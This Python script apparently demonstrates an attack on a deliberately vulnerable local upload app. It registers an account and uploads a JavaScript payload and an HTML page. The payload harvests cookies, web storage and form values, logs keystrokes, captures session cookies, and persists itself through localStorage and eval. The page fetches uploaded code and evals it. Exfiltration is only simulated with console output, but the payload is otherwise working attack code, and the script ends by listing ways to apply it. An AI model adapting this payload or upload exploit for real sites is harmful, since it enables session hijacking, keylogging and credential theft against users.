#!/usr/bin/env python3
"""
JavaScript File Sharing Demonstration
Shows how to apply JavaScript file sharing in the vulnerable upload system
"""

import requests
import time
import os

BASE_URL = "http://127.0.0.1:5000"

def create_advanced_js_payload():
    """Create an advanced JavaScript payload for sharing"""
    js_content = """
// Advanced JavaScript File Sharing Payload
console.log('🚨 ADVANCED JAVASCRIPT PAYLOAD LOADED');

// Data harvesting function
function harvestAllData() {
    const data = {
        // Browser information
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookieEnabled: navigator.cookieEnabled,
        
        // Page information
        url: window.location.href,
        title: document.title,
        referrer: document.referrer,
        
        // Storage data
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        
        // Form data (if any)
        forms: Array.from(document.forms).map(form => ({
            action: form.action,
            method: form.method,
            elements: Array.from(form.elements).map(el => ({
                name: el.name,
                type: el.type,
                value: el.value
            }))
        })),
        
        // Timestamp
        timestamp: new Date().toISOString()
    };
    
    console.log('📊 HARVESTED DATA:', data);
    
    // Simulate sending data to attacker server
    console.log('📡 Sending harvested data to attacker...');
    
    return data;
}

// Keylogger function
function startKeylogger() {
    console.log('⌨️ KEYLOGGER STARTED');
    let keystrokes = [];
    
    document.addEventListener('keypress', function(e) {
        keystrokes.push({
            key: e.key,
            timestamp: new Date().toISOString(),
            target: e.target.tagName
        });
        
        // Log every 10 keystrokes
        if (keystrokes.length % 10 === 0) {
            console.log('⌨️ CAPTURED KEYSTROKES:', keystrokes.slice(-10));
        }
    });
}

// Session hijacking function
function hijackSession() {
    console.log('🔓 ATTEMPTING SESSION HIJACK');
    
    if (document.cookie) {
        console.log('🍪 SESSION COOKIES CAPTURED:', document.cookie);
        
        // Simulate sending cookies to attacker
        const cookieData = {
            cookies: document.cookie,
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
        
        console.log('📡 SENDING SESSION DATA TO ATTACKER:', cookieData);
    }
}

// Persistence mechanism
function establishPersistence() {
    console.log('🔄 ESTABLISHING PERSISTENCE');
    
    // Store malicious script in localStorage
    localStorage.setItem('malicious_payload', `
        console.log('🔄 PERSISTENT PAYLOAD EXECUTED');
        // Re-execute main payload
        harvestAllData();
    `);
    
    // Execute on every page load
    window.addEventListener('load', function() {
        const persistentPayload = localStorage.getItem('malicious_payload');
        if (persistentPayload) {
            eval(persistentPayload);
        }
    });
}

// Main execution
function executePayload() {
    console.log('🚀 EXECUTING MAIN PAYLOAD');
    
    // Show visible alert
    alert('🚨 JAVASCRIPT FILE SHARING SUCCESSFUL!\\n\\nThis demonstrates how uploaded JS files can be shared and executed.\\n\\nCheck console for detailed output.');
    
    // Execute all attack functions
    harvestAllData();
    startKeylogger();
    hijackSession();
    establishPersistence();
    
    console.log('✅ ALL ATTACK VECTORS DEPLOYED');
}

// Auto-execute when script loads
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', executePayload);
} else {
    executePayload();
}

// Also execute on window load
window.addEventListener('load', executePayload);

console.log('🎯 JAVASCRIPT FILE SHARING PAYLOAD READY');
"""
    return js_content

def create_html_with_js_inclusion():
    """Create HTML that includes shared JavaScript files"""
    html_content = """<!DOCTYPE html>
<html>
<head>
    <title>JavaScript File Sharing Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .demo-section { margin: 20px 0; padding: 20px; border: 1px solid #ccc; }
        .warning { background: #ffebee; color: #c62828; padding: 10px; border-radius: 4px; }
        .success { background: #e8f5e8; color: #2e7d32; padding: 10px; border-radius: 4px; }
    </style>
</head>
<body>
    <h1>🚨 JavaScript File Sharing Demonstration</h1>
    
    <div class="warning">
        <strong>WARNING:</strong> This page demonstrates JavaScript file sharing vulnerabilities.
        Check your browser console for detailed output.
    </div>
    
    <div class="demo-section">
        <h2>1. Direct JavaScript Inclusion</h2>
        <p>Including uploaded JavaScript files directly:</p>
        <script src="http://127.0.0.1:5000/uploads/malicious.js"></script>
        <script src="http://127.0.0.1:5000/uploads/malicious_payload.js"></script>
    </div>
    
    <div class="demo-section">
        <h2>2. Dynamic Script Loading</h2>
        <p>Loading JavaScript files dynamically:</p>
        <button onclick="loadDynamicScript()">Load Dynamic Script</button>
        <div id="dynamic-result"></div>
    </div>
    
    <div class="demo-section">
        <h2>3. Cross-Origin Inclusion</h2>
        <p>This demonstrates how JavaScript files can be included from any domain.</p>
        <div class="success">
            JavaScript files are accessible without CORS restrictions!
        </div>
    </div>
    
    <script>
        function loadDynamicScript() {
            console.log('🔄 Loading dynamic script...');
            
            const script = document.createElement('script');
            script.src = 'http://127.0.0.1:5000/uploads/advanced_sharing.js';
            script.onload = function() {
                document.getElementById('dynamic-result').innerHTML = 
                    '<div class="success">✅ Dynamic script loaded successfully!</div>';
            };
            script.onerror = function() {
                document.getElementById('dynamic-result').innerHTML = 
                    '<div class="warning">❌ Failed to load dynamic script</div>';
            };
            
            document.head.appendChild(script);
        }
        
        // Demonstrate fetch-based loading
        function fetchAndExecute() {
            fetch('http://127.0.0.1:5000/uploads/malicious_payload.js')
                .then(response => response.text())
                .then(code => {
                    console.log('📥 Fetched JavaScript code:', code.substring(0, 100) + '...');
                    eval(code);
                })
                .catch(error => console.error('❌ Fetch error:', error));
        }
        
        // Auto-execute fetch demo
        setTimeout(fetchAndExecute, 2000);
    </script>
</body>
</html>"""
    return html_content

def register_and_login():
    """Register and login to the system"""
    session = requests.Session()
    
    # Register
    username = f"js_demo_{int(time.time())}"
    register_data = {
        'username': username,
        'email': f'{username}@test.com',
        'password': 'password123'
    }
    
    print(f"📝 Registering user: {username}")
    response = session.post(f"{BASE_URL}/register", data=register_data)
    
    # Login
    login_data = {
        'username': username,
        'password': 'password123'
    }
    
    print(f"🔐 Logging in as: {username}")
    response = session.post(f"{BASE_URL}/login", data=login_data)
    
    if response.status_code == 200 and 'login' not in response.url:
        print("✅ Login successful")
        return session
    else:
        print("❌ Login failed")
        return None

def upload_js_file(session, filename, content):
    """Upload a JavaScript file"""
    files = {'file': (filename, content, 'application/javascript')}
    
    print(f"📤 Uploading JavaScript file: {filename}")
    response = session.post(f"{BASE_URL}/upload", files=files)
    
    if response.status_code == 200:
        print(f"✅ Successfully uploaded: {filename}")
        return True
    else:
        print(f"❌ Failed to upload: {filename}")
        return False

def test_js_access(filename):
    """Test accessing uploaded JavaScript file"""
    url = f"{BASE_URL}/uploads/{filename}"
    
    print(f"🔍 Testing access to: {url}")
    response = requests.get(url)
    
    if response.status_code == 200:
        print(f"✅ JavaScript file accessible: {filename}")
        print(f"📄 Content preview: {response.text[:100]}...")
        return True
    else:
        print(f"❌ Cannot access: {filename}")
        return False

def main():
    """Main demonstration function"""
    print("🚀 JavaScript File Sharing Demonstration")
    print("=" * 50)
    
    # Step 1: Register and login
    session = register_and_login()
    if not session:
        print("❌ Cannot proceed without login")
        return
    
    # Step 2: Create and upload advanced JavaScript payload
    js_content = create_advanced_js_payload()
    upload_js_file(session, 'advanced_sharing.js', js_content)
    
    # Step 3: Create and upload HTML with JavaScript inclusion
    html_content = create_html_with_js_inclusion()
    upload_js_file(session, 'js_sharing_demo.html', html_content)
    
    # Step 4: Test file access
    print("\n🔍 Testing JavaScript File Access:")
    test_js_access('advanced_sharing.js')
    test_js_access('js_sharing_demo.html')
    test_js_access('malicious.js')
    test_js_access('malicious_payload.js')
    
    # Step 5: Provide access URLs
    print("\n🌐 JavaScript File Sharing URLs:")
    print(f"📄 Advanced Payload: {BASE_URL}/uploads/advanced_sharing.js")
    print(f"📄 Demo HTML: {BASE_URL}/uploads/js_sharing_demo.html")
    print(f"📄 Basic Malicious JS: {BASE_URL}/uploads/malicious.js")
    print(f"📄 Advanced Malicious JS: {BASE_URL}/uploads/malicious_payload.js")
    
    print("\n🎯 How to Apply JavaScript File Sharing:")
    print("1. Direct Access: Visit any of the URLs above")
    print("2. Include in HTML: <script src='URL'></script>")
    print("3. Dynamic Loading: createElement('script')")
    print("4. Fetch and Execute: fetch(URL).then(eval)")
    print("5. Cross-Site Inclusion: Include from any domain")
    
    print("\n⚠️  Security Impact:")
    print("- Unrestricted JavaScript execution")
    print("- Session hijacking capabilities")
    print("- Data harvesting and keylogging")
    print("- Persistent malware hosting")
    print("- Cross-site script inclusion")
    
    print(f"\n🌐 Open browser to: {BASE_URL}/uploads/js_sharing_demo.html")
    print("Check browser console for detailed vulnerability demonstration!")

if __name__ == "__main__":
    main() 